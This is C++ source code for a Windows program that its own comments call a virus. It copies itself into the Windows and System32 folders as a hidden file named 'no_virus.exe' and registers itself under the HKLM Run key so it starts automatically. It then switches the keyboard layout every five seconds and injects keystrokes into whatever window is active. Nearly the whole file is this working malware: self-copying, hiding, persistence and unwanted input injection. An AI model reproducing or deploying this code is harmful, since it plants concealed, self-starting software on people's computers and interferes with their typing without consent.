#include <iostream>
#include <windows.h>
using namespace std;


WINAPI WinMain(HINSTANCE hint, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {


	HKEY key;
	char sysdir[256], windir[256], myname[256];

	//get path to this file
	GetModuleFileName(hint, myname, 256);
	//get Windows folder path
	GetWindowsDirectory(windir, sizeof(windir));
	//get system32 folder path
	GetSystemDirectory(sysdir, sizeof(sysdir));

	//get the virusname to sysdir and windir paths to copy virus there
	strcat(windir, "\\no_virus.exe");
	strcat(sysdir, "\\no_virus.exe");

	//copy self to these dirs
	CopyFile(myname, windir, FALSE);
	CopyFile(myname, sysdir, FALSE);
	//make copied files hidden
	SetFileAttributes(windir, FILE_ATTRIBUTE_HIDDEN);
	SetFileAttributes(sysdir, FILE_ATTRIBUTE_HIDDEN);

	//go to windows autolaunch
	RegCreateKeyEx(HKEY_LOCAL_MACHINE,
		"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		"",
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		0,
		&key,
		0);
	if(key) {
		RegSetValueEx(key, "no_virus.exe", 0, REG_SZ, (LPBYTE)myname, strlen(myname));
		RegCloseKey(key);
	}
	// RegOpenKeyEx(HKEY_LOCAL_MACHINE, \
	// 	"Software\\Microsoft\\Windows\\CurrentVersion\\Run", \
	// 	 0, KEY_WRITE, &key);
	// RegSetValueEx(key, "no_virus.exe", 0, REG_SZ, (BYTE *)sysdir, 256);
	// RegCloseKey(key);

	// Sleep(60000*2);
	// HWND window_word;
	while(true) {
		// window_word = FindWindow(NULL, "Microsoft.docx");
		// if (window_word!=0) {
			cout << "Print!" << endl;
			// ShowWindow(window_word, SC_MAXIMIZE);
			LoadKeyboardLayout("00000419", KLF_ACTIVATE);
			keybd_event('F', 0,0,0);
			keybd_event('F', 0,KEYEVENTF_KEYUP,0);
			keybd_event('V', 0,0,0);
			keybd_event('V', 0,KEYEVENTF_KEYUP,0);
			keybd_event('J', 0,0,0);
			keybd_event('J', 0,KEYEVENTF_KEYUP,0);
			keybd_event('U', 0,0,0);
			keybd_event('U', 0,KEYEVENTF_KEYUP,0);
			keybd_event('E', 0,0,0);
			keybd_event('E', 0,KEYEVENTF_KEYUP,0);
			keybd_event('C', 0,0,0);
			keybd_event('C', 0,KEYEVENTF_KEYUP,0);
			keybd_event(VK_SPACE, 0,0,0);
			keybd_event(VK_SPACE, 0,KEYEVENTF_KEYUP,0);
		// }
		Sleep(5000);
	}
}
